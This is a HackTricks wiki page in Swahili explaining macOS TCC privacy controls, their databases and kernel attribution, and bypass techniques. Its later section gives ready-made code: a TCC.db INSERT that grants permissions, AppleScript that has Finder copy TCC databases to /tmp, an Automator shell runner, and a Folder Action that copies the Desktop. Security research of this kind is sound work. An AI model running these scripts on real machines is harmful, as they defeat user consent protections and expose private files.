# macOS TCC

{{#include ../../../../banners/hacktricks-training.md}}

## **Maelezo ya Msingi**

**TCC (Transparency, Consent, and Control)** ni itifaki ya usalama inayolenga kudhibiti ruhusa za programu. Jukumu lake kuu ni kulinda vipengele nyeti kama vile **huduma za eneo, anwani, picha, maikrofoni, kamera, ufikivu na ufikiaji kamili wa diski**. Kwa kuhitaji idhini ya wazi ya mtumiaji kabla ya kuruhusu programu kufikia vipengele hivi, TCC huimarisha faragha na uwezo wa mtumiaji kudhibiti data yake.

Watumiaji hukutana na TCC programu zinapoomba ruhusa ya kufikia vipengele vinavyolindwa. Hili huonekana kupitia kidokezo kinachomruhusu mtumiaji **kukubali au kukataa ufikiaji**. Zaidi ya hayo, TCC huruhusu vitendo vya moja kwa moja vya mtumiaji, kama vile **kuburuta na kudondosha faili kwenye programu**, ili kuruhusu ufikiaji wa faili mahususi na kuhakikisha kwamba programu zinafikia tu vitu vilivyoruhusiwa waziwazi.

![Mfano wa kidokezo cha TCC](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** inasimamiwa na **daemon** iliyoko `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` na kusanidiwa katika `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (ikisajili huduma ya mach `com.apple.tccd.system`).

Kuna **tccd ya user-mode** inayoendeshwa kwa kila mtumiaji aliyeingia, na imefafanuliwa katika `/System/Library/LaunchAgents/com.apple.tccd.plist`; husajili huduma za mach `com.apple.tccd` na `com.apple.usernotifications.delegate.com.apple.tccd`.

Hapa unaweza kuona tccd ikiendeshwa kama system na kama user:

```bash
ps -ef | grep tcc
    0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
  501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```

Ruhusa **hurithiwa kutoka kwa** programu ya **mzazi**, na **ruhusa** **hufuatiliwa** kulingana na **Bundle ID** na **Developer ID**.

### Hifadhidata za TCC

Ruhusa/kunyimwa ruhusa huhifadhiwa katika baadhi ya hifadhidata za TCC:

- Hifadhidata ya mfumo mzima katika **`/Library/Application Support/com.apple.TCC/TCC.db`** .
  - Hifadhidata hii **inalindwa na SIP**, kwa hivyo ni SIP bypass pekee inayoweza kuiandikia.
- Hifadhidata ya TCC ya mtumiaji **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** kwa mapendeleo ya kila mtumiaji.
  - Hifadhidata hii inalindwa, kwa hivyo ni michakato yenye haki za juu za TCC, kama Full Disk Access, pekee inayoweza kuiandikia (lakini hailindwi na SIP).

> [!WARNING]
> Hifadhidata zilizotajwa hapo juu pia **zinalindwa na TCC dhidi ya ufikiaji wa kusoma**. Kwa hivyo, **hutaweza kusoma** hifadhidata ya kawaida ya TCC ya mtumiaji wako isipokuwa usome ukiwa ndani ya mchakato wenye haki za TCC.
>
> Hata hivyo, kumbuka kuwa mchakato wenye haki hizi za juu (kama **FDA** au **`kTCCServiceEndpointSecurityClient`**) utaweza kuandika kwenye hifadhidata ya TCC ya watumiaji.

- Kuna hifadhidata ya **tatu** ya TCC katika **`/var/db/locationd/clients.plist`** inayoonyesha wateja wanaoruhusiwa **kufikia huduma za eneo**.
- **`/Library/Application Support/com.apple.TCC/REG.db`** hurekodi njia za hifadhidata za TCC zilizosajiliwa. Hifadhidata ya mtumiaji iliyopandikizwa inaweza kukataliwa isipokuwa imesajiliwa; kujua njia hii pekee hakukupi ufikiaji wa hifadhidata yoyote kati ya hizo mbili.<sup>[[6]](#references)</sup>
- **`/Library/Application Support/com.apple.TCC/MDMOverrides.plist`** ina maamuzi yanayosimamiwa ya Privacy Preferences Policy Control (PPPC). Ikague programu inapokuwa na ruhusa iliyosimamiwa ambayo haipo kwenye safu za kawaida za `access`.<sup>[[7]](#references)</sup>
- Faili inayolindwa na SIP **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (lakini inayoweza kusomwa na mtu yeyote) ni orodha ya programu zinazoruhusiwa ambazo zinahitaji ubaguzi wa TCC.

> [!TIP]
> Hifadhidata ya TCC katika **iOS** iko kwenye **`/private/var/mobile/Library/TCC/TCC.db`**

> [!TIP]
> **UI ya notification center** inaweza kufanya **mabadiliko katika hifadhidata ya TCC ya mfumo**:
>
> ```bash
> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
> [..]
> com.apple.private.tcc.manager
> com.apple.rootless.storage.TCC
> ```
>
> Hata hivyo, watumiaji wanaweza **kuweka upya sheria** kwa kutumia zana ya mstari wa amri **`tccutil`**; haina operesheni ya kuuliza iliyoandikwa rasmi.<sup>[[4]](#references)</sup>

#### Hoji hifadhidata

{{#tabs}}
{{#tab name="user DB"}}

```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```

{{#endtab}}

{{#tab name="system DB"}}

```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```

{{#endtab}}
{{#endtabs}}

> [!TIP]
> Kwa kuangalia hifadhidata zote mbili, unaweza kuona ruhusa ambazo programu imeruhusu, imekataza, au haina (itaomba ruhusa hiyo).

- **`service`** ni uwakilishi wa mfuatano wa **ruhusa** ya TCC
- **`client`** ni **bundle ID** au **njia ya binary** yenye ruhusa hizo
- **`client_type`** huonyesha kama ni Bundle Identifier(0) au njia kamili(1)

<details>

<summary>Jinsi ya kutekeleza ikiwa ni njia kamili</summary>

Tumia tu **`launctl load you_bin.plist`**, ukiwa na plist kama hii:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <!-- Label for the job -->
    <key>Label</key>
    <string>com.example.yourbinary</string>

    <!-- The path to the executable -->
    <key>Program</key>
    <string>/path/to/binary</string>

    <!-- Arguments to pass to the executable (if any) -->
    <key>ProgramArguments</key>
    <array>
        <string>arg1</string>
        <string>arg2</string>
    </array>

    <!-- Run at load -->
    <key>RunAtLoad</key>
    <true/>

    <!-- Keep the job alive, restart if necessary -->
    <key>KeepAlive</key>
    <true/>

    <!-- Standard output and error paths (optional) -->
    <key>StandardOutPath</key>
    <string>/tmp/YourBinary.stdout</string>
    <key>StandardErrorPath</key>
    <string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```

</details>

- **`auth_value`** inaweza kuwa na thamani tofauti: denied(0), unknown(1), allowed(2), au limited(3).
- **`auth_reason`** inaweza kuwa na thamani zifuatazo: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
- Sehemu ya **csreq** huonyesha jinsi ya kuthibitisha binary itakayotekelezwa na kupewa ruhusa za TCC:

```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```

- Kwa maelezo zaidi kuhusu **sehemu nyingine** za jedwali, [**angalia chapisho hili la blogu**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).<sup>[[1]](#references)</sup>

Unaweza pia kuangalia **ruhusa ambazo tayari zimetolewa** kwa programu katika `System Preferences --> Security & Privacy --> Privacy --> Files and Folders`.

> [!TIP]
> Watumiaji wanaweza **kuweka upya** kanuni kwa kutumia **`tccutil`**, lakini lazima wakague databases ili kupata taarifa kuhusu ruhusa zilizotolewa.<sup>[[4]](#references)</sup>

#### Weka upya ruhusa za TCC

```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```

#### Tambua ruhusa za mtumaji na lengwa za Apple Events

Ruhusa ya Automation ni uamuzi wa **mtumaji-kwa-lengwa**, si ruhusa ya kudhibiti kila programu. Ukiwa na ufikiaji wa hifadhidata ya mtumiaji, orodhesha jozi zinazoruhusiwa za mtumaji/lengwa kabla ya kujaribu workflows za [Apple Events](macos-apple-events.md) au Finder zilizo hapa chini. `csreq` humtambua mtumaji na `indirect_object_code_identity` hulitambua lengwa; decode blob yoyote isiyo null kwa kutumia mbinu ya `csreq` iliyo hapo juu.<sup>[[1]](#references)</sup>

```bash
sqlite3 "$HOME/Library/Application Support/com.apple.TCC/TCC.db" \
  "SELECT client, indirect_object_identifier AS target, \
          hex(csreq) AS sender_req, \
          hex(indirect_object_code_identity) AS target_req \
   FROM access WHERE service='kTCCServiceAppleEvents' AND auth_value=2;"
```

### Ukaguzi wa Sahihi za TCC

**Hifadhidata** ya TCC **huhifadhi** **Bundle ID** ya programu, lakini pia **huhifadhi** **taarifa** kuhusu **sahihi** ili **kuhakikisha** kuwa programu inayoomba kutumia ruhusa ndiyo sahihi.

```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```

> [!WARNING]
> Kwa hiyo, programu nyingine zinazotumia jina na bundle ID sawa hazitaweza kufikia ruhusa zilizopewa programu nyingine.

### Entitlements na Ruhusa za TCC

Ruhusa ya TCC haitabatilisha vizuizi vya **App Sandbox**. Mteja wa kamera aliye kwenye sandbox anahitaji `com.apple.security.device.camera`; Apple pia hutoa uwezo huu kwa programu za Hardened Runtime. Hakuna entitlement kati ya hizi inayopita ombi tofauti la mtumiaji la kutoa idhini. Usichukulie entitlement ya sandbox kuwa sharti lisilo na masharti kwa kila mchakato usio kwenye sandbox. Ombi linaposhindwa, kagua entitlements za executable na programu inayowajibika.<sup>[[8]](#references)[[9]](#references)</sup>

Kumbuka kwamba entitlements ni faili za plist na ni sehemu ya code sig; huhashiwa zaidi kwenye code sig kwa kutumia nafasi maalum, na zinaweza kuulizwa na kernel kupitia kernel code au na user-mode code kwa kutumia `csops(#169)` au `csops_audittoken(#170)`.

Hata hivyo, programu zinapotaka **kufikia** **baadhi ya folda za mtumiaji**, kama vile `~/Desktop`, `~/Downloads` na `~/Documents`, **hazihitaji** kuwa na **entitlements** maalum. Mfumo hushughulikia ufikiaji huo kwa uwazi na **humwomba mtumiaji idhini** inapohitajika.

- [https://newosxbook.com/ent.php](https://newosxbook.com/ent.php)

Programu za Apple **hazitaonyesha maombi ya idhini**. Zina **ruhusa zilizopewa mapema** kwenye orodha ya **entitlements** zake, kumaanisha kwamba **hazitaonyesha dirisha ibukizi kamwe**, **wala** hazitaonekana kwenye **databesi za TCC**. Kwa mfano:

```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
    <string>kTCCServiceReminders</string>
    <string>kTCCServiceCalendar</string>
    <string>kTCCServiceAddressBook</string>
</array>
```

Hii itazuia Calendar kuwauliza watumiaji ruhusa ya kufikia vikumbusho, kalenda na kitabu cha anwani.

> [!TIP]
> Mbali na baadhi ya nyaraka rasmi kuhusu entitlements, inawezekana pia kupata **maelezo ya kuvutia yasiyo rasmi kuhusu entitlements kwenye** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)

Baadhi ya ruhusa za TCC ni: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Hakuna orodha ya umma inayofafanua ruhusa zote, lakini unaweza kuangalia [**orodha hii ya zinazojulikana**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).<sup>[[1]](#references)</sup>

### Maeneo nyeti yasiyolindwa

- $HOME (yenyewe)
- $HOME/.ssh, $HOME/.aws, n.k.
- /tmp

### Nia ya Mtumiaji / com.apple.macl

Kama ilivyotajwa awali, inawezekana **kuipa App ruhusa ya kufikia faili kwa kuiburuta na kuiacha kwenye App hiyo**. Ruhusa hii haitaonyeshwa kwenye hifadhidata yoyote ya TCC, bali kama **attribute iliyopanuliwa ya faili**. Attribute hii **itahifadhi UUID** ya App iliyoruhusiwa:<sup>[[2]](#references)</sup>

```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
    uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```

> [!TIP]
> Inashangaza kwamba sifa ya **`com.apple.macl`** inadhibitiwa na **Sandbox**, si tccd.
>
> Pia kumbuka kwamba ukihamisha faili inayoruhusu UUID ya programu kwenye kompyuta yako hadi kwenye kompyuta nyingine, haitaruhusu programu hiyo kufikia faili, kwa sababu programu hiyo hiyo itakuwa na UID tofauti.

Sifa iliyopanuliwa `com.apple.macl` **haiwezi kufutwa** kama sifa nyingine zilizopanuliwa kwa sababu **inalindwa na SIP**. Hata hivyo, kama [**ilivyoelezwa katika chapisho hili**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), inawezekana kuizima kwa **kuweka faili kwenye ZIP**, **kuifuta** na **kuifungua kutoka kwenye ZIP**.<sup>[[3]](#references)</sup>






## Utaratibu wa Mchakato Unaowajibika wa XNU

Katika macOS/iOS, utaratibu wa **mchakato unaowajibika** ni kipengele muhimu cha usalama kinachotumiwa na mfumo wa **TCC (Transparency, Consent, and Control)** na mifumo mingine ya usalama kufuatilia ni mchakato upi unaowajibika hatimaye kwa kitendo fulani, hata katika msururu wa michakato-toto.

TCC inapokagua ruhusa (kwa mfano, kamera, maikrofoni, eneo), haikagui kila mara mchakato wa moja kwa moja unaotuma ombi. Badala yake, hukagua **mchakato unaowajibika**—kwa kawaida programu ya GUI iliyoanzisha kitendo hicho, hata kama ombi halisi limetumwa na mchakato msaidizi au daemon.

Ili kutambua programu inayohusishwa na ombi, tiririsha ujumbe wa `AttributionChain` wa TCC huku ukianzisha operesheni iliyolindwa. Hii ni njia ya kuaminika zaidi kuliko kuipa ruhusa faili ya programu saidizi kwa sababu tu ndiyo iliyopiga simu ya API. Linganisha utambulisho ulioripotiwa na bundle ID au njia pamoja na sharti la kutia sahihi katika safu husika ya `access`.<sup>[[10]](#references)</sup>

```bash
log stream --debug --predicate 'subsystem == "com.apple.TCC" AND eventMessage BEGINSWITH "AttributionChain"'
```

<details>
<summary>Jinsi Responsible Process Inavyowekwa</summary>

### Sehemu za Muundo wa Process

Kila process katika XNU huhifadhi vitambulishi viwili muhimu vya UUID:

```c
// From bsd/sys/proc_internal.h
struct proc {
    // ...
    pid_t   p_responsible_pid;          // PID of the responsible process
    uint8_t p_uuid[16];                 // UUID from LC_UUID load command (self)
    uint8_t p_responsible_uuid[16];     // UUID of pid responsible for this process
    // ...
};
```

- **`p_uuid`**: UUID ya mchakato wenyewe (kutoka kwenye amri ya kupakia `LC_UUID` ya binary yake ya Mach-O)
- **`p_responsible_pid`**: PID ya mchakato unaowajibika
- **`p_responsible_uuid`**: UUID ya mchakato unaowajibika (hubaki hata baada ya mchakato huo kusitishwa)

### Jinsi Mchakato Unaowajibika Unavyowekwa

1. **Wakati wa Kuunda Mchakato (Fork)**

Mchakato mpya unapoundwa kupitia `fork()` au `posix_spawn()`, mchakato unaowajibika hurithiwa kutoka kwa mchakato mzazi (`exec()` syscall hutumia tena muundo wa `proc` uliopo, kwa hivyo hatua hii hairudiwi hapo):

**Mahali**: `bsd/kern/kern_fork.c:1053`

```c
// In fork1_internal() - called during all process creation
proc_set_responsible_pid(child_proc, parent_proc->p_responsible_pid);
```

**Mambo Muhimu:**
- Michakato tanzu **hurithi** `p_responsible_pid` ya mzazi
- Hii huunda **mnyororo wa uwajibikaji** katika safu ya michakato
- Mchakato unaowajibika kwa kawaida huelekeza kwenye programu asili ya GUI

2. **Kazi Kuu: `proc_set_responsible_pid()`**

**Mahali**: `bsd/kern/kern_proc.c:4817-4831`

```c
void
proc_set_responsible_pid(proc_t target_proc, pid_t responsible_pid)
{
    target_proc->p_responsible_pid = responsible_pid;
    
    if (responsible_pid >= 0) {
        proc_t responsible_proc = proc_find(responsible_pid);
        if (responsible_proc != PROC_NULL) {
            // Copy the responsible process's UUID for persistent identification
            proc_getexecutableuuid(responsible_proc, 
                target_proc->p_responsible_uuid, 
                sizeof(target_proc->p_responsible_uuid));
            proc_rele(responsible_proc);
        }
    }
    return;
}
```

**Kazi ya function hii:**
1. **Huweka PID inayohusika** kwenye process lengwa
2. **Hutafuta process inayohusika** kwa kutumia `proc_find()` (huongeza reference count)
3. **Hunakili UUID** kutoka `p_uuid` ya process inayohusika hadi `p_responsible_uuid` ya process lengwa
4. **Huachilia reference** kwa kutumia `proc_rele()` (hupunguza reference count)

3. **Kwa Nini Kuhifadhi PID na UUID Zote Mbili?**

Mbinu ya kuhifadhi vyote viwili hutatua tatizo muhimu:

| Field | Purpose | Problem | Solution |
|-------|---------|---------|----------|
| `p_responsible_pid` | Utafutaji wa haraka wa process ya sasa | PID inaweza kutumika tena baada ya process kutoka | Hutumika kutafuta process inayotumika |
| `p_responsible_uuid` | Utambulisho unaodumu | Hubaki baada ya process kusitishwa | Hutumika kwa ukaguzi wa usalama na auditing |

**Tatizo**: Ikiwa process inayohusika itatoka kabla ya child, PID inaweza kutumika tena na kupewa process tofauti kabisa.

**Suluhisho**: UUID haiwezi kubadilishwa na hutambulisha kipekee binary mahususi iliyohusika, hata baada ya kutoka.

### Mtiririko wa Uundaji wa Process

```
┌─────────────────────────────────────────────────────────────┐
│ Parent Process (e.g., Safari)                               │
│ p_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81              │
│ p_responsible_pid: 1234 (points to itself)                 │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
└─────────────────────┬───────────────────────────────────────┘
                      │
                      │ fork() / posix_spawn()
                      ▼
         ┌────────────────────────────┐
         │ kern_fork.c:fork1_internal │
         │                            │
         │ proc_set_responsible_pid(  │
         │   child_proc,              │
         │   parent->p_responsible_pid│
         │ );                         │
         └────────────┬───────────────┘
                      │
                      ▼
         ┌────────────────────────────┐
         │ proc_set_responsible_pid() │
         │                            │
         │ 1. Set p_responsible_pid   │
         │ 2. Find responsible proc   │
         │ 3. Copy UUID               │
         │ 4. Release reference       │
         └────────────┬───────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────────────────────┐
│ Child Process (e.g., SafariHelper)                          │
│ p_uuid: B266C9DD-8E3F-4AAA-9F1E-71D2E3CDEF82              │
│ p_responsible_pid: 1234 (inherited from parent)            │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
│                     (copied from Safari)                    │
└─────────────────────────────────────────────────────────────┘
```

### Chanzo cha UUID: Amri ya Kupakia ya LC_UUID

UUID iliyohifadhiwa katika `p_uuid` hutoka kwenye **amri ya kupakia ya `LC_UUID` ya executable ya Mach-O**:

1. **Wakati wa Kukompile**

```bash
# When linking, the linker (ld) generates a unique UUID
$ ld -o myapp myapp.o
# Embedded in the Mach-O binary as LC_UUID load command
```

2. **Muda wa Utekelezaji**

**Mahali**: `bsd/kern/mach_loader.c:2393-2413`

```c
static load_return_t
load_uuid(struct uuid_command *uulp, char *command_end, load_result_t *result)
{
    if ((uulp->cmdsize < sizeof(struct uuid_command)) ||
        (((char *)uulp + sizeof(struct uuid_command)) > command_end)) {
        return LOAD_BADMACHO;
    }

    // Extract UUID from LC_UUID load command
    memcpy(&result->uuid[0], &uulp->uuid[0], sizeof(result->uuid));
    return LOAD_SUCCESS;
}
```

3. **Imehifadhiwa katika Muundo wa Mchakato**

**Mahali**: `bsd/kern/kern_exec.c:2281`

```c
// After loading the Mach-O binary during exec()
proc_setexecutableuuid(p, &load_result.uuid[0]);
```

**Mahali**: `bsd/kern/kern_proc.c:1912-1915`

```c
void
proc_setexecutableuuid(proc_t p, const unsigned char *uuid)
{
    memcpy(p->p_uuid, uuid, sizeof(p->p_uuid));
}
```
</details>


## TCC Privesc & Bypasses

### Kuingiza kwenye TCC

Ikiwa wakati fulani utafanikiwa kupata ufikiaji wa kuandika kwenye hifadhidata ya TCC, unaweza kutumia kitu kama hiki kuongeza ingizo (ondoa maoni):

<details>

<summary>Mfano wa kuingiza kwenye TCC</summary>

```sql
INSERT INTO access (
    service,
    client,
    client_type,
    auth_value,
    auth_reason,
    auth_version,
    csreq,
    policy_id,
    indirect_object_identifier_type,
    indirect_object_identifier,
    indirect_object_code_identity,
    flags,
    last_modified,
    pid,
    pid_version,
    boot_uuid,
    last_reminded
) VALUES (
    'kTCCServiceSystemPolicyDesktopFolder', -- service
    'com.googlecode.iterm2', -- client
    0, -- client_type (0 - bundle id)
    2, -- auth_value  (2 - allowed)
    3, -- auth_reason (3 - "User Set")
    1, -- auth_version (always 1)
    X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
    NULL, -- policy_id
    NULL, -- indirect_object_identifier_type
    'UNUSED', -- indirect_object_identifier - default value
    NULL, -- indirect_object_code_identity
    0, -- flags
    strftime('%s', 'now'), -- last_modified with default current timestamp
    NULL, -- assuming pid is an integer and optional
    NULL, -- assuming pid_version is an integer and optional
    'UNUSED', -- default value for boot_uuid
    strftime('%s', 'now') -- last_reminded with default current timestamp
);
```

</details>

### TCC Payloads

Ikiwa umefanikiwa kuingia ndani ya app yenye ruhusa za TCC, angalia ukurasa ufuatao wenye TCC payloads ili kuzitumia vibaya:


{{#ref}}
macos-tcc-payloads.md
{{#endref}}

### Apple Events

Jifunze kuhusu Apple Events katika:


{{#ref}}
macos-apple-events.md
{{#endref}}

### Automation (Finder) to FDA*

Jina la ruhusa ya Automation katika TCC ni: **`kTCCServiceAppleEvents`**\
Ruhusa hii mahususi ya TCC pia huonyesha **application inayoweza kudhibitiwa** ndani ya database ya TCC (kwa hivyo ruhusa hizo haziruhusu kudhibiti kila kitu tu).

**Finder** ni application ambayo **daima ina FDA** (hata kama haionekani kwenye UI), kwa hivyo ukiwa na ruhusa za **Automation** juu yake, unaweza kutumia vibaya ruhusa zake **kuifanya itekeleze baadhi ya vitendo**.\
Katika hali hii, app yako itahitaji ruhusa ya **`kTCCServiceAppleEvents`** juu ya **`com.apple.Finder`**.<sup>[[4]](#references)</sup>

{{#tabs}}
{{#tab name="Steal users TCC.db"}}

```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
    set homeFolder to path to home folder as string
    set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
    set targetFolder to POSIX file "/tmp" as alias
    duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```

{{#endtab}}

{{#tab name="Steal systems TCC.db"}}

```applescript
osascript<<EOD
tell application "Finder"
    set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
    set targetFolder to POSIX file "/tmp" as alias
    duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```

{{#endtab}}
{{#endtabs}}

Toleo la write lililoripotiwa, wakati njia ya Automation kwenda Finder inapatikana, ni kumfanya Finder **abadilishe jina la directory ya mtumiaji `com.apple.TCC`**. Kisha database iliyo chini ya njia iliyopewa jina jipya ilinakiliwa hadi directory ya staging, ikarekebishwa hapo, ikanakiliwa tena, na jina la directory kurejeshwa. Row mpya ya `kTCCServiceAppleEvents` lazima itambue **binary inayotuma na Finder**, ikijumuisha code requirements zao; kumruhusu mtumaji bila utambulisho wa lengo si sawa. Mbinu hii hutegemea path, kwa hivyo ithibitishe kwenye toleo lengwa la macOS badala ya kudhani kuwa Finder Automation pekee inaruhusu kuandika database yoyote.<sup>[[11]](#references)</sup>

> [!WARNING]
> Kwa ruhusa hii utaweza **kumwomba Finder afikie folda zilizozuiwa na TCC** na akupe faili, lakini kadiri ninavyojua **hutaweza kumfanya Finder atekeleze code yoyote kiholela** ili kutumia vibaya ufikiaji wake wa FDA kikamilifu.
>
> Kwa hiyo, hutaweza kutumia vibaya uwezo wote wa FDA.

Hii ndiyo prompt ya TCC ya kupata ruhusa za Automation juu ya Finder:

<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

> [!CAUTION]
> Kumbuka kwamba kwa kuwa app ya **Automator** ina ruhusa ya TCC ya **`kTCCServiceAppleEvents`**, inaweza **kudhibiti app yoyote**, kama Finder. Kwa hiyo, ukiwa na ruhusa ya kudhibiti Automator unaweza pia kudhibiti **Finder** kwa code kama iliyo hapa chini:

<details>

<summary>Pata shell ndani ya Automator</summary>

```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
   set actionID to Automator action id "com.apple.RunShellScript"
   tell (make new workflow)
      add actionID to it
      tell last Automator action
         set value of setting "inputMethod" to 1
         set value of setting "COMMAND_STRING" to theScript
      end tell
      execute it
   end tell
   activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```

</details>

Hali hiyo hiyo hutokea kwa **Script Editor app,** inaweza kudhibiti Finder, lakini huwezi kuilazimisha itekeleze script kwa kutumia AppleScript.

### Automation (SE) kwa baadhi ya TCC

**System Events inaweza kuunda Folder Actions, na Folder Actions zinaweza kufikia baadhi ya folda za TCC** (Desktop, Documents na Downloads), kwa hivyo script kama ifuatayo inaweza kutumika kutumia vibaya tabia hii:

```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
    -- Ensure Folder Actions are enabled
    set folder actions enabled to true

    -- Define the path to the folder and the script
    set homeFolder to path to home folder as text
    set folderPath to homeFolder & "Desktop"
    set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

    -- Create or get the Folder Action for the Desktop
    if not (exists folder action folderPath) then
        make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
    end if
    set myFolderAction to folder action folderPath

    -- Attach the script to the Folder Action
    if not (exists script scriptPath of myFolderAction) then
        make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
    end if

    -- Enable the Folder Action and the script
    enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```

### Automation (SE) + Accessibility (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** hadi FDA\*

